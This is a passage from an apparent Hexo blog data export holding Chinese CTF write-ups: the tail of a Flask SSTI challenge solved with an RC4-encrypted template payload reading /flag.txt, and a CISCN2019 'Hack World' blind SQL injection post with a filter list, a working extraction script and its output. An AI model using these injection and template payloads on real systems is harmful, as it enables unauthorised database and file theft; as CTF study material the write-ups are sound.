class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Tell me your secret.I will encrypt it so others can\\'t see'</span></span><br><span class=\"line\"></span><br><span class=\"line\">    rc=rc4_Modified.RC4(<span class=\"string\">\"HereIsTreasure\"</span>)   <span class=\"comment\">#解密</span></span><br><span class=\"line\"></span><br><span class=\"line\">    deS=rc.do_crypt(secret)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    a=render_template_string(safe(deS))</span><br><span class=\"line\"></span><br><span class=\"line\"> [Open an interactive python shell <span class=\"keyword\">in</span> this frame]  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">'ciscn'</span> <span class=\"keyword\">in</span> a.lower():</span><br><span class=\"line\">python</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'flag detected!'</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br></pre></td></tr></table></figure>\n\n<p>是RC4加密，RC4算法加密又是解密将payload加密就好</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 2/25/2020 11:38 PM</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RC4</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, key)</span>:</span></span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\">        self.key_length = len(key)</span><br><span class=\"line\">        self._init_S_box()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_init_S_box</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        self.Box = [i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">256</span>)]</span><br><span class=\"line\">        k = [self.key[i % self.key_length] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">256</span>)]</span><br><span class=\"line\">        j = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">256</span>):</span><br><span class=\"line\">            j = (j + self.Box[i] + ord(k[i])) % <span class=\"number\">256</span></span><br><span class=\"line\">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">crypt</span><span class=\"params\">(self, plaintext)</span>:</span></span><br><span class=\"line\">        i = <span class=\"number\">0</span></span><br><span class=\"line\">        j = <span class=\"number\">0</span></span><br><span class=\"line\">        result = <span class=\"string\">''</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> plaintext:</span><br><span class=\"line\">            i = (i + <span class=\"number\">1</span>) % <span class=\"number\">256</span></span><br><span class=\"line\">            j = (j + self.Box[i]) % <span class=\"number\">256</span></span><br><span class=\"line\">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class=\"line\">            t = (self.Box[i] + self.Box[j]) % <span class=\"number\">256</span></span><br><span class=\"line\">            result += chr(self.Box[t] ^ ord(ch))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://69f0dda2-d8d5-458e-97f9-342bff8d47a4.node3.buuoj.cn/secret?secret=\"</span></span><br><span class=\"line\">a = RC4(<span class=\"string\">'HereIsTreasure'</span>)</span><br><span class=\"line\">cmd = <span class=\"string\">\"&#123;&#123; [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() &#125;&#125;\"</span></span><br><span class=\"line\">payload = urllib.parse.quote(a.crypt(cmd))</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">res = requests.get(url + payload)</span><br><span class=\"line\">print(res.text)</span><br></pre></td></tr></table></figure>"},{"title":"buuoj刷题记录3","date":"2019-12-27T04:42:41.000Z","_content":"\n## [CISCN2019 华北赛区 Day2 Web1]Hack World\n\n### 0x00 基础\n\nSQL盲注，使用`if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）`函数一个一个的猜字符，过滤绕过，空格可以使用`+、\\t、/**/、()`绕过。\n```\nif(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值\nascii(char)\nsubstr（str,pos,len)\n```\n<!--more-->\n\n### 0x01 分析\n\n题目提示\n\n```\nflag{} 里为 uuid\n```\n\n访问页面\n\n![](/pic/3.jpg)\n\n\n\n使用burp suite进行sql fuzz测试，以下字符被过滤\n\n|       %20        | 482  | SQL Injection Checked |\n| :--------------: | ---- | --------------------- |\n|       AND        | 482  | SQL Injection Checked |\n|      DELETE      | 482  | SQL Injection Checked |\n|     END-EXEC     | 482  | SQL Injection Checked |\n|      GROUP       | 482  | SQL Injection Checked |\n|      INSERT      | 482  | SQL Injection Checked |\n|       INTO       | 482  | SQL Injection Checked |\n|      LIMIT       | 482  | SQL Injection Checked |\n|        OR        | 482  | SQL Injection Checked |\n|      UNION       | 482  | SQL Injection Checked |\n|      UPDATE      | 482  | SQL Injection Checked |\n|        +         | 482  | SQL Injection Checked |\n|        /         | 482  | SQL Injection Checked |\n|        -         | 482  | SQL Injection Checked |\n|        *         | 482  | SQL Injection Checked |\n|        `         | 482  | SQL Injection Checked |\n|        \"         | 482  | SQL Injection Checked |\n|       \\|\\|       | 482  | SQL Injection Checked |\n|        &&        | 482  | SQL Injection Checked |\n|       %23        | 482  | SQL Injection Checked |\n|;|482|SQL Injection Checked |\n`if,substr,ascii,<,>,=,(),/t`都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用`/t、( )代替`\n\n### 0x02 开始操作\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 12/27/2019 6:11 PM\nimport requests\nimport time\n\nurl = \"http://97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn/index.php\"\nresult = ''\n\nfor x in range(1, 43):\n    high = 126\n    low = 45\n    mid = (low + high) // 2\n\n\n    while high - low > 1:\n        payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)\" % (x, mid)\n        data = {\n            \"id\": payload\n        }\n        time.sleep(0.3)\n        res = requests.post(url, data = data)\n        if 'Hello' in res.text:\n            low = mid\n        else:\n            high = mid\n        mid = (low + high) // 2\n\n    if high - low == 1:\n        payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)\" % (x, high)\n        data = {\n            \"id\": payload\n        }\n        response = requests.post(url, data=data)\n        if 'Hello' in response.text:\n            result += chr(int(mid+1))\n        else :\n            result += chr(int(mid))\n    else :\n        result += chr(int(mid))\n    print(result)\n```\n\n```bash\nf\nfl\nfla\nflag\nflag{\nflag{a\nflag{a2\nflag{a22\nflag{a22c\nflag{a22cf\nflag{a22cf6\nflag{a22cf69\nflag{a22cf690\nflag{a22cf690-\nflag{a22cf690-3\nflag{a22cf690-34\nflag{a22cf690-342\nflag{a22cf690-342a\nflag{a22cf690-342a-\nflag{a22cf690-342a-4\nflag{a22cf690-342a-4b\nflag{a22cf690-342a-4bf\nflag{a22cf690-342a-4bf4\nflag{a22cf690-342a-4bf4-\nflag{a22cf690-342a-4bf4-8\nflag{a22cf690-342a-4bf4-88\nflag{a22cf690-342a-4bf4-885\nflag{a22cf690-342a-4bf4-885b\nflag{a22cf690-342a-4bf4-885b-\nflag{a22cf690-342a-4bf4-885b-d\nflag{a22cf690-342a-4bf4-885b-df\nflag{a22cf690-342a-4bf4-885b-df3\nflag{a22cf690-342a-4bf4-885b-df33\nflag{a22cf690-342a-4bf4-885b-df332\nflag{a22cf690-342a-4bf4-885b-df332d\nflag{a22cf690-342a-4bf4-885b-df332d4\nflag{a22cf690-342a-4bf4-885b-df332d44\nflag{a22cf690-342a-4bf4-885b-df332d446\nflag{a22cf690-342a-4bf4-885b-df332d4469\nflag{a22cf690-342a-4bf4-885b-df332d44698\nflag{a22cf690-342a-4bf4-885b-df332d44698d\nflag{a22cf690-342a-4bf4-885b-df332d44698d}\n```\n\n因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。\n\n\n\n","source":"_posts/buuoj刷题记录3.md","raw":"---\ntitle: buuoj刷题记录3\ndate: 2019-12-27 12:42:41\ntags:\n - ciscn\n - web\n - ctf\n - buuctf\ncategories: \n - 刷题记录\n---\n\n## [CISCN2019 华北赛区 Day2 Web1]Hack World\n\n### 0x00 基础\n\nSQL盲注，使用`if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）`函数一个一个的猜字符，过滤绕过，空格可以使用`+、\\t、/**/、()`绕过。\n```\nif(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值\nascii(char)\nsubstr（str,pos,len)\n```\n<!--more-->\n\n### 0x01 分析\n\n题目提示\n\n```\nflag{} 里为 uuid\n```\n\n访问页面\n\n![](/pic/3.jpg)\n\n\n\n使用burp suite进行sql fuzz测试，以下字符被过滤\n\n|       %20        | 482  | SQL Injection Checked |\n| :--------------: | ---- | --------------------- |\n|       AND        | 482  | SQL Injection Checked |\n|      DELETE      | 482  | SQL Injection Checked |\n|     END-EXEC     | 482  | SQL Injection Checked |\n|      GROUP       | 482  | SQL Injection Checked |\n|      INSERT      | 482  | SQL Injection Checked |\n|       INTO       | 482  | SQL Injection Checked |\n|      LIMIT       | 482  | SQL Injection Checked |\n|        OR        | 482  | SQL Injection Checked |\n|      UNION       | 482  | SQL Injection Checked |\n|      UPDATE      | 482  | SQL Injection Checked |\n|        +         | 482  | SQL Injection Checked |\n|        /         | 482  | SQL Injection Checked |\n|        -         | 482  | SQL Injection Checked |\n|        *         | 482  | SQL Injection Checked |\n|        `         | 482  | SQL Injection Checked |\n|        \"         | 482  | SQL Injection Checked |\n|       \\|\\|       | 482  | SQL Injection Checked |\n|        &&        | 482  | SQL Injection Checked |\n|       %23        | 482  | SQL Injection Checked |\n|;|482|SQL Injection Checked |\n`if,substr,ascii,<,>,=,(),/t`都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用`/t、( )代替`\n\n### 0x02 开始操作\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 12/27/2019 6:11 PM\nimport requests\nimport time\n\nurl = \"http://97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn/index.php\"\nresult = ''\n\nfor x in range(1, 43):\n    high = 126\n    low = 45\n    mid = (low + high) // 2\n\n\n    while high - low > 1:\n        payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)\" % (x, mid)\n        data = {\n            \"id\": payload\n        }\n        time.sleep(0.3)\n        res = requests.post(url, data = data)\n        if 'Hello' in res.text:\n            low = mid\n        else:\n            high = mid\n        mid = (low + high) // 2\n\n    if high - low == 1:\n        payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)\" % (x, high)\n        data = {\n            \"id\": payload\n        }\n        response = requests.post(url, data=data)\n        if 'Hello' in response.text:\n            result += chr(int(mid+1))\n        else :\n            result += chr(int(mid))\n    else :\n        result += chr(int(mid))\n    print(result)\n```\n\n```bash\nf\nfl\nfla\nflag\nflag{\nflag{a\nflag{a2\nflag{a22\nflag{a22c\nflag{a22cf\nflag{a22cf6\nflag{a22cf69\nflag{a22cf690\nflag{a22cf690-\nflag{a22cf690-3\nflag{a22cf690-34\nflag{a22cf690-342\nflag{a22cf690-342a\nflag{a22cf690-342a-\nflag{a22cf690-342a-4\nflag{a22cf690-342a-4b\nflag{a22cf690-342a-4bf\nflag{a22cf690-342a-4bf4\nflag{a22cf690-342a-4bf4-\nflag{a22cf690-342a-4bf4-8\nflag{a22cf690-342a-4bf4-88\nflag{a22cf690-342a-4bf4-885\nflag{a22cf690-342a-4bf4-885b\nflag{a22cf690-342a-4bf4-885b-\nflag{a22cf690-342a-4bf4-885b-d\nflag{a22cf690-342a-4bf4-885b-df\nflag{a22cf690-342a-4bf4-885b-df3\nflag{a22cf690-342a-4bf4-885b-df33\nflag{a22cf690-342a-4bf4-885b-df332\nflag{a22cf690-342a-4bf4-885b-df332d\nflag{a22cf690-342a-4bf4-885b-df332d4\nflag{a22cf690-342a-4bf4-885b-df332d44\nflag{a22cf690-342a-4bf4-885b-df332d446\nflag{a22cf690-342a-4bf4-885b-df332d4469\nflag{a22cf690-342a-4bf4-885b-df332d44698\nflag{a22cf690-342a-4bf4-885b-df332d44698d\nflag{a22cf690-342a-4bf4-885b-df332d44698d}\n```\n\n因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。\n\n\n\n","slug":"buuoj刷题记录3","published":1,"updated":"2019-12-27T04:42:41.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfk6000epk7edjgpejvu","content":"<h2 id=\"CISCN2019-华北赛区-Day2-Web1-Hack-World\"><a href=\"#CISCN2019-华北赛区-Day2-Web1-Hack-World\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day2 Web1]Hack World\"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>SQL盲注，使用<code>if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）</code>函数一个一个的猜字符，过滤绕过，空格可以使用<code>+、\\t、/**/、()</code>绕过。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值</span><br><span class=\"line\">ascii(char)</span><br><span class=\"line\">substr（str,pos,len)</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题目提示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;&#125; 里为 uuid</span><br></pre></td></tr></table></figure>\n\n<p>访问页面</p>\n<p><img src=\"/pic/3.jpg\" alt=\"\"></p>\n<p>使用burp suite进行sql fuzz测试，以下字符被过滤</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">%20</th>\n<th>482</th>\n<th>SQL Injection Checked</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">AND</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">DELETE</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">END-EXEC</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">GROUP</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">INSERT</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">INTO</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">LIMIT</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">OR</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">UNION</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">UPDATE</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">+</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">/</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">-</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">*</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">`</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">“</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">||</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">&amp;&amp;</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">%23</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">;</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\"><code>if,substr,ascii,&lt;,&gt;,=,(),/t</code>都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用<code>/t、( )代替</code></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 12/27/2019 6:11 PM</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn/index.php\"</span></span><br><span class=\"line\">result = <span class=\"string\">''</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, <span class=\"number\">43</span>):</span><br><span class=\"line\">    high = <span class=\"number\">126</span></span><br><span class=\"line\">    low = <span class=\"number\">45</span></span><br><span class=\"line\">    mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> high - low &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">        payload = <span class=\"string\">\"if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,2)\"</span> % (x, mid)</span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>: payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        time.sleep(<span class=\"number\">0.3</span>)</span><br><span class=\"line\">        res = requests.post(url, data = data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'Hello'</span> <span class=\"keyword\">in</span> res.text:</span><br><span class=\"line\">            low = mid</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            high = mid</span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> high - low == <span class=\"number\">1</span>:</span><br><span class=\"line\">        payload = <span class=\"string\">\"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)\"</span> % (x, high)</span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>: payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        response = requests.post(url, data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'Hello'</span> <span class=\"keyword\">in</span> response.text:</span><br><span class=\"line\">            result += chr(int(mid+<span class=\"number\">1</span>))</span><br><span class=\"line\">        <span class=\"keyword\">else</span> :</span><br><span class=\"line\">            result += chr(int(mid))</span><br><span class=\"line\">    <span class=\"keyword\">else</span> :</span><br><span class=\"line\">        result += chr(int(mid))</span><br><span class=\"line\">    print(result)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f</span><br><span class=\"line\">fl</span><br><span class=\"line\">fla</span><br><span class=\"line\">flag</span><br><span class=\"line\">flag&#123;</span><br><span class=\"line\">flag&#123;a</span><br><span class=\"line\">flag&#123;a2</span><br><span class=\"line\">flag&#123;a22</span><br><span class=\"line\">flag&#123;a22c</span><br><span class=\"line\">flag&#123;a22cf</span><br><span class=\"line\">flag&#123;a22cf6</span><br><span class=\"line\">flag&#123;a22cf69</span><br><span class=\"line\">flag&#123;a22cf690</span><br><span class=\"line\">flag&#123;a22cf690-</span><br><span class=\"line\">flag&#123;a22cf690-3</span><br><span class=\"line\">flag&#123;a22cf690-34</span><br><span class=\"line\">flag&#123;a22cf690-342</span><br><span class=\"line\">flag&#123;a22cf690-342a</span><br><span class=\"line\">flag&#123;a22cf690-342a-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4b</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-8</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-88</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b<span class=\"_\">-d</span></span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df3</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df33</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d446</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d4469</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。</p>\n","site":{"data":{}},"excerpt":"<h2 id=\"CISCN2019-华北赛区-Day2-Web1-Hack-World\"><a href=\"#CISCN2019-华北赛区-Day2-Web1-Hack-World\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day2 Web1]Hack World\"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>SQL盲注，使用<code>if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）</code>函数一个一个的猜字符，过滤绕过，空格可以使用<code>+、\\t、/**/、()</code>绕过。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值</span><br><span class=\"line\">ascii(char)</span><br><span class=\"line\">substr（str,pos,len)</span><br></pre></td></tr></table></figure>","more":"<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题目提示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;&#125; 里为 uuid</span><br></pre></td></tr></table></figure>\n\n<p>访问页面</p>\n<p><img src=\"/pic/3.jpg\" alt=\"\"></p>\n<p>使用burp suite进行sql fuzz测试，以下字符被过滤</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">%20</th>\n<th>482</th>\n<th>SQL Injection Checked</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">AND</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">DELETE</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">END-EXEC</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">GROUP</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">INSERT</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">INTO</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">LIMIT</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">OR</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">UNION</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">UPDATE</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">+</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">/</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">-</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">*</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td 